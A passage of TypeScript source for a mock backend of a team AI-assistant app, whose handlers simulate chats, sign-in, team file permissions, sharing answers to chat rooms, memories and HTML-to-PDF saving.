      assistant.files = { saved: [{ path: 'marketing/report.md', action: 'create' }], conflicts: [{ path: 'marketing/plan.md', copyPath: 'marketing/plan (충돌 사본 - AI).md' }], rejected: [{ path: 'finance/2026/q3.csv', reason: 'read only' }] }
      pub({ type: 'files.changed', data: { changes: [{ path: 'marketing/report.md', action: 'create', by: null, turnId }] } })
    }
    assistant.usage = { inputTokens: 100, outputTokens: 50, costUsd: 0.001 }
    assistant.model = 'claude-sonnet'
    assistant.engine = 'claude-code'
    const chat = this.chats.find((c) => c.id === chatId)!
    chat.runState = 'idle'
    chat.updatedAt = now()
    // like the server (migration 252): an answer that finished is unseen until the person has the chat on screen; how it
    // ended when not well (Chat.lastOutcome: failed, or paused at a limit)
    chat.unseen = true
    if (assistant.status === 'error') chat.lastOutcome = 'error'
    else if (assistant.status === 'done' && assistant.stopReason) chat.lastOutcome = 'paused'
    else delete chat.lastOutcome
    if (!chat.title) chat.title = prompt.slice(0, 30)
    this.queueRevision++
    pub({ type: 'message.done', data: { chatId, messageId: assistant.id, status: assistant.status, message: this.view(assistant) } })
    // "long answer": like an answer that ran over a minute (server/src/chat/runtime.ts LONG_ANSWER_MS): worth telling
    pub({ type: 'chat.updated', data: { chatId, change: 'updated', chat, ...(/long answer/i.test(prompt) && assistant.status !== 'stopped' ? { notify: 'answer' as const } : {}) } })
    void user
  }

  startTurn(chatId: string, user: User, prompt: string, parentId: string): Message {
    const chat = this.chats.find((c) => c.id === chatId)!
    const turnId = uuidv7()
    const assistant = this.message({ chatId, role: 'assistant', parentId, status: 'streaming', turnId, engine: chat.engine })
    this.activeLeaf.set(chatId, assistant.id)
    if (/queue-hold/.test(prompt)) this.queuePositions.set(chatId, 3)
    chat.runState = this.queuePositions.has(chatId) ? 'queued' : 'running'
    this.queueRevision++
    const gen = this.generation
    // a reset in between abandons the turn (its chat is gone)
    this.runTurn(chatId, user, prompt, assistant).catch((e) => { if (gen === this.generation) console.error('mock turn failed', e) })
    return assistant
  }

  // ---------------- handlers ----------------
  handlers: Partial<Record<ApiName, Handler>> = {
    frequentQuestions: () => ({ items: [], days: 30, sampled: false }),
    // like server/src/skills/popular.ts: only skills the caller can read now, with their title
    popularSkills: (c) => ({ items: this.popular.flatMap((p) => { const s = this.skillsFor(c.user).find((x) => x.path === p.path && !x.personal); return s ? [{ ...s, uses: p.uses, users: p.users }] : [] }), days: 30 }),
    listSkillIssues: () => ({ items: [] }),
    // the "/" menu, the Skills page and the owner's checklist on the home screen: like the server, the skills the caller
    // can read (none in the seed; POST /__test/skills adds some)
    listSkills: (c) => ({ items: this.skillsFor(c.user, c.query.shadowed === '1') }),
    health: () => ({ ok: true, version: this.serverVersion, schema: { applied: 2, readerLevel: 1 }, uptimeSec: 1, time: now() }),
    setupStatus: () => ({ needed: this.setupNeeded, teamName: this.setupNeeded ? null : this.settings.teamName, defaultLocale: this.settings.defaultLocale }),
    setup: (c) => {
      if (!this.setupNeeded) fail('conflict', 409)
      if (c.body.setupToken !== 'setup-token-0123456789') fail('forbidden', 403, 'wrong setup token')
      this.setupNeeded = false
      this.settings.teamName = c.body.teamName
      this.settings.defaultLocale = c.body.locale
      // like the server: the browser's time zone becomes the team's
      if (typeof c.body.timeZone === 'string') this.settings.timeZone = c.body.timeZone
      const u = this.addUser({ id: c.body.owner.username.toLowerCase().replace(/[^a-z0-9_-]/g, ''), username: c.body.owner.username, name: c.body.owner.name, role: 'owner', groupIds: [] }, c.body.owner.password)
      this.files.set('users', { type: 'folder', mtime: now() })
      return { status: 201, cookie: this.startSession(u), body: { me: this.me(u, '') } }
    },
    login: (c) => {
      const u = this.users.find((x) => x.username === c.body.username)
      // like the server: before sign-in, the page's language header, else the team default
      const loc = Locale.safeParse(c.req.headers.get(LOCALE_HEADER)).data ?? this.settings.defaultLocale
      const wrong = { ko: '아이디나 비밀번호가 맞지 않아요.', en: 'Wrong username or password.', id: 'Nama pengguna atau kata sandi salah.', ja: 'ユーザー名またはパスワードが正しくありません。', es: 'El nombre de usuario o la contraseña son incorrectos.' }[loc]
      if (!u || this.passwords.get(u.username) !== c.body.password) fail('unauthorized', 401, wrong)
      if (u!.mustChangePassword) this.tempLogins.add(u!.id)
      else this.tempLogins.delete(u!.id)
      return { cookie: this.startSession(u!), body: { me: this.me(u!, '') } }
    },
    logout: () => ({ cookie: `${DEV_SESSION_COOKIE}=; Path=/; Max-Age=0`, body: undefined }),
    me: (c) => this.me(c.user, ''),
    // team chat rooms and the people directory (the sidebar and the phone's 대화 tab read them on every page): like a
    // server whose people are in no room yet, and the active people by name only (server/src/routes/people.ts)
    listRooms: () => ({ items: this.rooms, alerts: { threadReplies: this.notifyPrefs.roomThreadReplies, quietHours: this.notifyPrefs.quietHours, timeZone: 'Asia/Seoul' } }),
    // Slack (docs/SLACK.md): a team that uses Slack, nobody linked yet, "Sign in with Slack" not set up: Settings › 앱
    // 커넥터 shows the Slack line with how to get a link; Admin › Slack shows a connected app
    mySlack: () => ({ available: true, workspace: 'Acme', link: null, signIn: false, emailSetByOther: false }),
    slackAdmin: () => ({
      enabled: true, tokens: true, workspace: { teamId: 'T0ACME', name: 'Acme', url: 'https://acme.slack.com' }, botName: 'trina', appId: 'A0ACME',
      state: 'connected', lastError: null, linkOrigin: 'http://127.0.0.1', linked: 0, manifest: '{}', createUrl: 'https://api.slack.com/apps?new_app=1',
      signIn: false, redirectUrl: null,
    }),
    listPeople: () => ({ people: this.users.filter((u) => u.status === 'active').map((u) => ({ id: u.id, name: u.name })) }),
    updateMe: (c) => {
      const u = c.user as User & { prefs?: Me['user']['prefs'] }
      if (c.body.name) u.name = c.body.name
      if (c.body.locale !== undefined) u.localeChoice = c.body.locale
      this.syncLocales()
      if (c.body.locale !== undefined) this.publish(LOCALE_CHANGED)
      if (c.body.email !== undefined) u.email = c.body.email
      if (c.body.prefs) {
        const next: Record<string, unknown> = { ...u.prefs, ...c.body.prefs }
        if (!this.canChoose(u)) { delete next.engine; delete next.model }
        for (const [k, v] of Object.entries(next)) if (v === undefined || v === null) delete next[k]
        u.prefs = next as Me['user']['prefs']
      }
      return this.me(u, '')
    },
    changePassword: (c) => {
      // like the server: no current password only right after signing in with a temporary one
      if (c.body.currentPassword === undefined) {
        if (!(c.user.mustChangePassword && this.tempLogins.has(c.user.id))) fail('validation', 400, 'current password required')
      } else if (this.passwords.get(c.user.username) !== c.body.currentPassword) fail('forbidden', 403, 'wrong password')
      this.passwords.set(c.user.username, c.body.newPassword)
      c.user.mustChangePassword = false
      this.tempLogins.delete(c.user.id)
      return { ok: true }
    },
    // Settings > Usage: made-up numbers for whoever is signed in (the real server reads only the caller's own turns,
    // tests/unit/a-my-usage.test.ts); the owner has a monthly limit of their own and a group's daily one
    myUsage: (c) => {
      const mine = c.user.id === 'olga'
      const end = new Date(Date.now() + 5 * 86400_000).toISOString()
      return {
        period: c.query.period ?? 'month', from: now(), to: now(),
        totals: mine ? { turns: 12, inputTokens: 12000, outputTokens: 3400, costUsd: 0.42 } : { turns: 3, inputTokens: 2000, outputTokens: 700, costUsd: 0.05 },
        byModel: mine
          ? [{ key: 'claude-code:sonnet', engine: 'claude-code', model: 'sonnet', turns: 9, inputTokens: 9000, outputTokens: 2600, costUsd: 0.3 }, { key: 'codex:', engine: 'codex', model: null, turns: 3, inputTokens: 3000, outputTokens: 800, costUsd: 0.12 }]
          : [{ key: 'claude-code:sonnet', engine: 'claude-code', model: 'sonnet', turns: 3, inputTokens: 2000, outputTokens: 700, costUsd: 0.05 }],
        limits: mine
          ? [{ scope: 'you', name: null, period: 'month', usedPct: 42, action: 'block', exceeded: false, resetsAt: end }, { scope: 'group', name: 'Design', period: 'day', usedPct: 12.5, action: 'warn', exceeded: false, resetsAt: end }]
          : [],
      }
    },
    mySessions: () => ({ items: [{ id: '0192f0a0-0000-7000-8000-000000000000', client: 'web', userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36', createdAt: now(), lastSeenAt: now(), expiresAt: now(), current: true }] }),
    inviteInfo: (c) => {
      const i = this.invites.find((x) => x.token === c.params.token)
      if (!i) fail('not_found', 404)
      return { teamName: this.settings.teamName, role: i!.role, expiresAt: i!.expiresAt, valid: !i!.usedAt }
    },
    acceptInvite: (c) => {
      const i = this.invites.find((x) => x.token === c.params.token && !x.usedAt)
      if (!i) fail('gone', 410)
      const u = this.addUser({ id: c.body.username.toLowerCase(), username: c.body.username, name: c.body.name, role: i!.role, groupIds: i!.groupIds, localeChoice: c.body.locale ?? null }, c.body.password)
      i!.usedAt = now()
      i!.usedBy = { id: u.id, name: u.name }
      return { status: 201, cookie: this.startSession(u), body: { me: this.me(u, '') } }
    },

    listChats: (c) => {
      const q = (c.query.q ?? '').toLowerCase()
      const trash = c.query.trash === '1' || c.query.trash === 'true'
      let list = this.chats.filter((x) => !!x.deletedAt === trash)
      if (c.query.projectId) list = list.filter((x) => x.projectId === c.query.projectId)
      if (q) list = list.filter((x) => x.title.toLowerCase().includes(q) || this.messages.some((m) => m.chatId === x.id && m.content.toLowerCase().includes(q)))
      return { items: [...list].sort((a, b) => (a.updatedAt < b.updatedAt ? 1 : -1)), nextCursor: null }
    },
    chatEngines: (c) => {
      const e = this.enginesResponse()
      const canChoose = this.canChoose(c.user)
      return {
        canChoose, defaultEngine: this.settings.defaultEngine, defaultModel: this.settings.defaultModel,
        engines: canChoose ? e.engines.filter((x) => x.enabled).map((x) => ({ id: x.id, label: x.label, models: x.models })) : [],
      }
    },
    createChat: (c) => {
      this.guardEngine('createChat', c.user, c.body, { engine: this.settings.defaultEngine, model: this.settings.defaultModel })
      const chat: Chat = { id: uuidv7(), projectId: c.body.projectId ?? null, title: c.body.title ?? '', engine: c.body.engine ?? 'claude-code', model: c.body.model ?? null, createdAt: now(), updatedAt: now(), deletedAt: null, runState: 'idle' }
      this.chats.push(chat)
      return { status: 201, body: chat }
    },
    getChat: (c) => this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404),
    getChatQueue: (c) => {
      const assistant = this.messages.find(m => m.chatId === c.params.id && m.status === 'streaming')
      const position = assistant ? this.queuePositions.get(c.params.id!) ?? 0 : null
      return { state: position === null ? 'idle' : position > 0 ? 'queued' : 'running',
        turnId: assistant?.turnId ?? null, messageId: assistant?.id ?? null, position, epoch: this.epoch, revision: this.queueRevision }
    },
    updateChat: (c) => {
      const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      this.guardEngine('updateChat', c.user, c.body, chat)
      Object.assign(chat, Object.fromEntries(Object.entries(c.body).filter(([, v]) => v !== undefined)))
      return chat
    },
    deleteChat: (c) => {
      const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      chat.deletedAt = now()
      return { id: chat.id, deletedAt: chat.deletedAt, purgeAt: new Date(Date.now() + 7 * 86400_000).toISOString() }
    },
    markChatSeen: (c) => {
      const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      if (chat.unseen) {
        delete chat.unseen
        this.publish({ type: 'chat.updated', data: { chatId: chat.id, change: 'updated', chat } })
      }
      return chat
    },
    restoreChat: (c) => {
      const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      chat.deletedAt = null
      return chat
    },
    listMessages: (c) => ({ items: this.path(c.params.id!), nextCursor: null }),
    messageSources: (c) => {
      const m = this.messages.find((x) => x.id === c.params.messageId && x.chatId === c.params.id) ?? fail('not_found', 404)
      const files: MessageSourceFile[] = []
      let unavailable = 0
      for (const f of this.sources.get(m.id) ?? []) {
        if (this.files.get(f.path)?.type === 'file' && this.access(f.path, c.user) !== 'none') files.push(f)
        else unavailable++
      }
      return { files, unavailable }
    },
    // "대화방에 보내기": like server/src/chat/answer-share.ts, short. A row per linked file; an answer with recorded
    // sources has the provenance line (the room's other members, the folders of the sources I may open, more I cannot)
    shareAnswerToRoom: (c) => {
      const m = this.messages.find((x) => x.id === c.params.messageId && x.chatId === c.params.id && x.role === 'assistant') ?? fail('not_found', 404)
      const room = this.rooms.find((r) => r.id === c.body.roomId) ?? fail('not_found', 404)
      if (m.status !== 'done' || !m.content.trim()) fail('conflict', 409, '끝난 답변만 대화방에 보낼 수 있어요. 답변이 끝난 뒤 다시 보내 주세요.')
      const list = this.roomMessages.get(room.id) ?? []
      const again = this.sharedByClientId.get(c.body.clientMessageId)
      if (again) return { status: 'sent', message: again, cut: !!again.sharedAnswer?.cut }
      const { body, at, cut } = answerShareBody(c.body.note, m.content, '…(이하 생략) 전체는 내 트리나 기록에서')
      const others = Math.max(1, room.memberCount - 1)
      // a person's own folder and finance/ are closed to the room's other members; anything else here they open
      const rows: AnswerShareFile[] = answerFilePaths(body.slice(at), 100).map((p) => {
        const f = this.files.get(p)
        if (f?.type !== 'file' || this.access(p, c.user) === 'none') return { name: '', missing: true, attach: 'hidden', unable: others }
        const unable = p.startsWith('users/') || p.startsWith('finance/') ? others : 0
        return { name: p.slice(p.lastIndexOf('/') + 1), path: p, missing: false, attach: !unable ? 'no' : f.data!.byteLength > SMALL_UPLOAD_MAX ? 'too_big' : 'yes', unable }
      })
      const used = this.sources.get(m.id) ?? []
      const mine = used.filter((f) => this.access(f.path, c.user) !== 'none')
      const folders = [...new Set(mine.map((f) => f.path.split('/').slice(0, -1).join('/')))]
      const provenance = used.length ? { people: others, places: folders.map((path) => ({ kind: 'folder' as const, path })), otherPlaces: mine.length < used.length } : null
      const confirmKey = `mock-${room.id}-${this.shareEpoch}`
      const may = new Set(rows.filter((r) => r.attach === 'yes').map((r) => r.path!))
      const attach = [...new Set((c.body.attach ?? []) as string[])]
      if (rows.some((r) => r.unable > 0) || provenance) {
        const yes = c.body.confirmKey === confirmKey || (c.body.confirmKey === undefined && (c.body.confirm ?? 0) >= others)
        if (!yes) return { status: 'confirm', people: others, places: provenance?.places ?? [], otherPlaces: !!provenance?.otherPlaces || rows.some((r) => r.missing), files: rows, provenance, confirmKey, ...(c.body.confirmKey !== undefined ? { reason: 'changed' as const } : {}) }
        if (attach.length > ROOM_FILES_MAX || attach.some((p) => !may.has(p))) fail('validation', 400)
      }
      // the team files it links to that I may open (a viewer's own check, like an AI answer in a room)
      const linked = [...body.matchAll(/[?&]path=([^&)\s#]+)/g)].map((x) => decodeURIComponent(x[1]!))
      const openable = [...new Set(linked)].filter((p) => this.files.get(p)?.type === 'file' && this.access(p, c.user) !== 'none')
      const files: RoomFile[] = (may.size ? attach : []).map((p) => ({ id: uuidv7(), name: p.slice(p.lastIndexOf('/') + 1), size: this.files.get(p)!.data!.byteLength, mime: mimeOf(p) ?? 'application/octet-stream', kind: 'text', thumb: false }))
      const seq = Math.max(room.lastSeq, 0, ...list.map((x) => x.seq)) + 1
      const message = RoomMessage.parse({
        id: uuidv7(), roomId: room.id, seq, authorKind: 'user', author: { id: c.user.id, name: c.user.name }, askedBy: null, visibility: 'room', body, replyTo: null,
        mentions: [], files, createdAt: now(), editedAt: null, deletedAt: null, sharedAnswer: { at, cut }, openable,
      })
      list.push(message)
      this.roomMessages.set(room.id, list)
      this.sharedByClientId.set(c.body.clientMessageId, message)
      Object.assign(room, { lastSeq: seq, lastReadSeq: seq, activityAt: message.createdAt, lastMessage: { id: message.id, seq, author: message.author, excerpt: body.slice(0, 120), fileCount: files.length, deleted: false, createdAt: message.createdAt } })
      this.publish({ type: 'room.message', data: { roomId: room.id, message } })
      return { status: 'sent', message, cut }
    },
    // the rooms' own reads: what was sent here, the room's people, no AI at work
    getRoom: (c) => this.rooms.find((r) => r.id === c.params.id) ?? fail('not_found', 404),
    listRoomMessages: (c) => {
      const room = this.rooms.find((r) => r.id === c.params.id) ?? fail('not_found', 404)
      return { items: this.roomMessages.get(room.id) ?? [], nextCursor: null }
    },
    listRoomMembers: (c) => {
      const room = this.rooms.find((r) => r.id === c.params.id) ?? fail('not_found', 404)
      return { items: [{ id: c.user.id, name: c.user.name }, ...room.peers].map((user) => ({ user, joinedAt: room.createdAt })) }
    },
    getRoomAi: (c) => (this.rooms.some((r) => r.id === c.params.id) ? { answering: 0, mine: [] } : fail('not_found', 404)),
    markRoomRead: (c) => {
      const room = this.rooms.find((r) => r.id === c.params.id) ?? fail('not_found', 404)
      Object.assign(room, { lastReadSeq: Math.max(room.lastReadSeq, c.body.seq), unreadCount: 0, mentioned: false })
      return { lastReadSeq: room.lastReadSeq, unreadCount: 0, mentioned: false }
    },
    listTurnRequests: (c) => ({ items: [...this.openAsks.values()].filter((r) => r.chatId === c.params.id) }),
    sendMessage: (c) => {
      const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      const dup = this.messages.find((m) => (m as Message & { cmid?: string }).cmid === c.body.clientMessageId)
      if (dup) fail('conflict', 409)
      this.guardEngine('sendMessage', c.user, c.body, chat)
      if (c.body.engine) chat.engine = c.body.engine
      if (c.body.model !== undefined) chat.model = c.body.model ?? null
      // like the server when the person's "block" usage limit is used up (refused before anything is queued)
      if (String(c.body.content).includes('over my limit')) fail('budget_exceeded', 429, '오늘 AI 사용 한도를 다 썼어요. 10월 22일 오전 12:00부터 다시 쓸 수 있어요.')
      // like a chat used while Safe operations 1A is on: it stays confidential (server/src/safe-ops/confidential.ts)
      if ((this.allConfidential || /confidential/i.test(String(c.body.content))) && !chat.confidential) {
        chat.confidential = true
        this.publish({ type: 'chat.updated', data: { chatId: chat.id, change: 'updated', chat } })
      }
      const parentId = c.body.parentId ?? this.activeLeaf.get(chat.id) ?? null
      const atts = (c.body.attachmentIds as string[]).map((id) => this.attachments.get(id)).filter(Boolean).map((a) => { const { data: _d, ...rest } = a!; return rest })
      const user = this.message({ chatId: chat.id, role: 'user', parentId, content: c.body.content, attachments: atts, author: { id: c.user.id, name: c.user.name } })
      ;(user as Message & { cmid?: string }).cmid = c.body.clientMessageId
      if (/^fail-send/.test(c.body.content)) fail('internal', 500, 'send failed on purpose')
      const assistant = this.startTurn(chat.id, c.user, c.body.content, user.id)
      return { status: 202, body: { userMessage: this.view(user), assistantMessage: this.view(assistant), turnId: assistant.turnId, queuePosition: this.queuePositions.get(chat.id) ?? 0, queueEpoch: this.epoch, queueRevision: this.queueRevision } }
    },
    stop: (c) => {
      const running = this.messages.find((m) => m.chatId === c.params.id && m.status === 'streaming')
      if (running?.turnId) this.stopped.add(running.turnId)
      return { stopped: !!running, turnId: running?.turnId ?? null }
    },
    regenerate: (c) => {
      const old = this.messages.find((m) => m.id === c.params.messageId) ?? fail('not_found', 404)
      const userMsg = this.messages.find((m) => m.id === old.parentId)!
      const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      this.guardEngine('regenerate', c.user, c.body, chat)
      if (c.body.engine) chat.engine = c.body.engine
      if (c.body.model !== undefined) chat.model = c.body.model ?? null
      const assistant = this.startTurn(c.params.id!, c.user, userMsg.content, userMsg.id)
      return { status: 202, body: { userMessage: null, assistantMessage: this.view(assistant), turnId: assistant.turnId, queuePosition: 0 } }
    },
    editMessage: (c) => {
      const old = this.messages.find((m) => m.id === c.params.messageId) ?? fail('not_found', 404)
      this.guardEngine('editMessage', c.user, c.body, this.chats.find((x) => x.id === old.chatId)!)
      const user = this.message({ chatId: old.chatId, role: 'user', parentId: old.parentId, content: c.body.content, author: { id: c.user.id, name: c.user.name } })
      const assistant = this.startTurn(old.chatId, c.user, c.body.content, user.id)
      return { status: 202, body: { userMessage: this.view(user), assistantMessage: this.view(assistant), turnId: assistant.turnId, queuePosition: 0 } }
    },
    selectBranch: (c) => {
      this.activeLeaf.set(c.params.id!, this.newestLeafUnder(c.body.messageId))
      return { items: this.path(c.params.id!), nextCursor: null }
    },
    answerTurn: (c) => {
      const r = this.pendingAsk.get(c.params.id!)
      // like server/src/routes/chats.ts: answered already (another window) or closed
      if (!r) fail('conflict', 409, '이미 답했거나 시간이 지난 질문이에요.')
      this.pendingAsk.delete(c.params.id!)
      r!(c.body.kind === 'ask_user' ? c.body.answer : c.body.decision)
      return undefined
    },
    listProjects: () => ({ items: this.projects }),
    createProject: (c) => {
      const p: Project = { id: uuidv7(), name: c.body.name, folderPath: c.body.folderPath ?? (c.body.scope === 'personal' ? `users/${c.user.id}/projects/${c.body.name}` : `projects/${c.body.name}`), instructions: c.body.instructions ?? '', createdBy: { id: c.user.id, name: c.user.name }, createdAt: now(), canEdit: true }
      this.projects.push(p)
      return { status: 201, body: p }
    },
    getProject: (c) => this.projects.find((p) => p.id === c.params.id) ?? fail('not_found', 404),
    updateProject: (c) => Object.assign(this.projects.find((p) => p.id === c.params.id) ?? fail('not_found', 404), c.body),
    deleteProject: (c) => {
      this.projects = this.projects.filter((p) => p.id !== c.params.id)
      return undefined
    },
    // the team setting (Team settings › Dev environment): like server/src/routes/dev-env.ts, turning on (srt) needs the
    // current warning accepted
    devEnvTeam: () => this.devEnvTeamView(),
    myDevEnvSites: (c) => this.devEnvSitesOf(c.user.id),
    removeMyDevEnvSite: (c) => {
      const mine = this.devEnvSitesOf(c.user.id) && this.devEnvSites.get(c.user.id)!
      if (!mine.sites.some((x) => x.host === c.body.host)) fail('not_found', 404)
      mine.sites = mine.sites.filter((x) => x.host !== c.body.host)
      return this.devEnvSitesOf(c.user.id)
    },
    setMyDevEnvFullInternet: (c) => {
      const now_ = this.devEnvSitesOf(c.user.id)
      if (c.body.on && (now_.state !== 'on' || c.body.acceptWarning !== 1)) fail('conflict', 409, 'Accept the Full internet warning first.')
      this.devEnvSites.get(c.user.id)!.full = c.body.on
      return this.devEnvSitesOf(c.user.id)
    },
    updateDevEnvTeam: (c) => {
      const v = this.devEnvTeamView()
      const b = c.body
      const before = this.devEnvTeam
      const after = { ...before, limits: { ...before.limits, ...(b.limits ?? {}) }, ...(b.extraDomains ? { extraDomains: b.extraDomains } : {}), ...(b.scope ? { scope: b.scope } : {}), ...(b.network ? { network: b.network } : {}), ...(b.enabled !== undefined ? { enabled: b.enabled } : {}) }
      if (v.runner === 'srt' && after.enabled && !(before.enabled && before.consent?.warningVersion === v.warningVersion) && after.consent?.warningVersion !== v.warningVersion) {
        if (b.acceptWarning !== v.warningVersion) fail('conflict', 409, '먼저 개발 환경 경고를 확인해 주세요.')
        after.consent = { by: { id: c.user.id, name: c.user.name }, at: now(), warningVersion: v.warningVersion }
      }
      this.devEnvTeam = after
      return this.devEnvTeamView()
    },
    // srt: the caller's runs and their cancel (the chat's waiting line, "devqueue" turns)
    myDevEnvRuns: (c) => {
      const srt = this.devEnv?.srt
      if (!srt) fail('not_found', 404)
      return { running: srt!.running.filter((r) => r.by?.id === c.user.id), waiting: srt!.waiting.filter((r) => r.by?.id === c.user.id) }
    },
    stopMyDevEnvRun: (c) => {
      const srt = this.devEnv?.srt
      if (!srt || ![...srt.running, ...srt.waiting].some((r) => r.id === c.params.runId && r.by?.id === c.user.id)) fail('not_found', 404)
      srt!.running = srt!.running.filter((r) => r.id !== c.params.runId)
      srt!.waiting = srt!.waiting.filter((r) => r.id !== c.params.runId)
      return { running: srt!.running.filter((r) => r.by?.id === c.user.id), waiting: srt!.waiting.filter((r) => r.by?.id === c.user.id) }
    },
    listMemories: () => ({ items: this.memories, nextCursor: null }),
    // like server/src/routes/memories.ts: folded to one line, 1–300 characters (the AI's limits), newest first
    createMemory: (c) => {
      const text = String(c.body.text).replace(/\s+/g, ' ').trim()
      if (!text) fail('validation', 400, '기억할 내용을 적어 주세요.', { 'body.text': 'empty' })
      if (text.length > 300) fail('validation', 400, `메모리는 한 줄에 300자까지 쓸 수 있어요(지금 ${text.length}자). 줄여 주세요.`, { 'body.text': 'too long' })
      const m: Memory = { id: uuidv7(), text, sourceChatId: null, createdAt: now() }
      this.memories.unshift(m)
      this.publish({ type: 'memory.changed', data: { change: 'created', memory: m } })
      return { status: 201, body: m }
    },
    updateMemory: (c) => {
      const m = this.memories.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      const text = String(c.body.text).replace(/\s+/g, ' ').trim()
      if (!text) fail('validation', 400, '기억할 내용을 적어 주세요.', { 'body.text': 'empty' })
      if (text.length > 300) fail('validation', 400, `메모리는 한 줄에 300자까지 쓸 수 있어요(지금 ${text.length}자). 줄여 주세요.`, { 'body.text': 'too long' })
      m.text = text
      this.publish({ type: 'memory.changed', data: { change: 'updated', memory: m } })
      return m
    },
    deleteMemory: (c) => {
      this.memories = this.memories.filter((m) => m.id !== c.params.id)
      return undefined
    },
    clearMemories: () => {
      this.memories = []
      return undefined
    },

    tree: (c) => {
      const path = c.query.path ?? ''
      if (path && !this.files.has(path)) fail('not_found', 404)
      if (this.access(path, c.user) === 'none' && path !== 'secret') fail('not_found', 404)
      const kids = [...this.files.entries()].filter(([p]) => (path ? p.startsWith(path + '/') && !p.slice(path.length + 1).includes('/') : !p.includes('/')))
      const entries = kids
        .map(([p, n]) => this.entry(p, n, c.user))
        .filter((e) => !(e.path.startsWith('users/') && e.access === 'none'))
        .sort((a, b) => (a.type !== b.type ? (a.type === 'folder' ? -1 : 1) : a.name.localeCompare(b.name)))
      return { path, access: this.access(path, c.user), entries, nextCursor: null }
    },
    content: (c) => {
      const n = this.files.get(c.query.path!)
      if (!n || n.type !== 'file' || this.access(c.query.path!, c.user) === 'none') fail('not_found', 404)
      return { path: c.query.path, size: n!.data!.byteLength, mtime: n!.mtime, sha256: new Bun.CryptoHasher('sha256').update(n!.data!).digest('hex'), mime: mimeOf(c.query.path!), binary: false, content: dec.decode(n!.data!), truncated: false, access: this.access(c.query.path!, c.user) }
    },
    saveContent: (c) => {
      let path: string = c.body.path
      if (this.access(path, c.user) !== 'write') fail('forbidden', 403)
      let conflict = false
      const cur = this.files.get(path)?.data
      if (cur && (c.body.baseSha256 === null || c.body.baseSha256 !== new Bun.CryptoHasher('sha256').update(cur).digest('hex'))) {
        conflict = true
        path = path.replace(/(\.[^.]+)?$/, (ext) => ` (충돌 사본 - ${c.user.name})${ext}`)
      }
      this.putFile(path, c.body.content)
      return { path, conflict, entry: this.entry(path, this.files.get(path)!, c.user) }
    },
    hwpPreview: async (c) => {
      const n = this.files.get(c.query.path!)
      if (!n || n.type !== 'file' || this.access(c.query.path!, c.user) === 'none') fail('not_found', 404)
      // the HWP Preview plugin installed and turned off: refused like the server's disabled renderer (not installed at
      // all, the mock still renders, so the other previews need no install step)
      if (this.plugins.installed.some((p) => p.id === 'app.trina.hwp-preview' && !p.enabled)) throw new Fail('unavailable', 503, undefined, undefined, { reason: 'disabled' })
      try {
        const r = await (await hwpEngine).render(Buffer.from(n!.data!), c.query.path!.endsWith('.hwpx') ? 'hwpx' : 'hwp', Number(c.query.page))
        return { ...r.meta, id: crypto.randomUUID(), png: r.bytes.toString('base64') }
      } catch (e) { throw new Fail('unavailable', 503, undefined, undefined, { reason: e && typeof e === 'object' && 'reason' in e ? String(e.reason) : 'engine' }) }
    },
    download: (c) => {
      const n = this.files.get(c.query.path!)
      if (!n || n.type !== 'file' || this.access(c.query.path!, c.user) === 'none') fail('not_found', 404)
      // an HTML file's preview (lib/frame-files.ts): like server/src/team-files/embed.ts, only a file everyone who can
      // read the page can read too
      const embedIn = c.query.embedIn as string | undefined
      if (embedIn !== undefined) {
        if (!this.files.has(embedIn) || this.access(embedIn, c.user) === 'none') fail('not_found', 404)
        if (this.users.some((u) => u.status === 'active' && this.access(embedIn, u) !== 'none' && this.access(c.query.path!, u) === 'none'))
          throw new Fail('forbidden', 403, undefined, undefined, { reason: 'embed_narrower' })
      }
      return new Response(n!.data! as unknown as BodyInit, { headers: { 'content-type': mimeOf(c.query.path!) ?? 'application/octet-stream', 'content-length': String(n!.data!.byteLength), 'content-disposition': 'attachment', 'x-content-type-options': 'nosniff', 'content-security-policy': "sandbox; default-src 'none'" } })
    },
    // "PDF로 저장" (server/src/team-files/html-pdf-save.ts): a one-page stand-in PDF next to the page, " (2)" when taken;
    // a folder the person cannot write: 403, and the panel downloads it instead
    saveHtmlPdf: (c) => {
      const page: string = c.body.path
      const n = this.files.get(page)
      if (!n || n.type !== 'file' || this.access(page, c.user) === 'none') fail('not_found', 404)
      if (!/\.html?$/i.test(page)) fail('validation', 400, 'HTML 파일만 PDF로 저장할 수 있어요.')
      if (!this.htmlPdf) fail('unavailable', 503, '이 서버에는 HTML을 PDF로 만드는 브라우저가 없어요. 관리자에게 알려 주세요.', undefined, { reason: 'unavailable' })
      const folder = page.includes('/') ? page.slice(0, page.lastIndexOf('/')) : ''
      if (this.access(folder, c.user) !== 'write') fail('forbidden', 403, '읽기 전용이라 바꿀 수 없어요.', undefined, { reason: 'read_only' })
      // a page that names a finance file: the PDF would let more people see it (html-pdf-save.ts htmlPdfWider)
      if (/finance\//.test(dec.decode(n!.data!))) fail('forbidden', 403, '이 페이지에 들어가는 파일 중 이 폴더를 보는 사람 모두가 볼 수는 없는 파일이 있어서 여기에 저장하지 않았어요.', undefined, { reason: 'wider_audience' })
      let out = page.replace(/\.[^./]+$/, '') + '.pdf'
      for (let i = 2; this.files.has(out); i++) out = `${page.replace(/\.[^./]+$/, '')} (${i}).pdf`
      this.putFile(out, MOCK_PDF)
      this.htmlPdfCalls.push({ path: page, how: 'save' })
      return { status: 201, body: { entry: this.entry(out, this.files.get(out)!, c.user), pages: 1, blocked: /https?:\/\//.test(dec.decode(n!.data!)) ? 1 : 0, scripts: /<script\b/i.test(dec.decode(n!.data!)) } }
    },
    downloadHtmlPdf: (c) => {
      // like the server: only this app starts a print (Fetch Metadata)
      const site = c.req.headers.get('sec-fetch-site')
      if (site !== null && site !== 'same-origin') fail('forbidden', 403, 'PDF는 이 앱에서만 만들 수 있어요.', undefined, { reason: 'cross_site' })
      const page = c.query.path!
      const n = this.files.get(page)
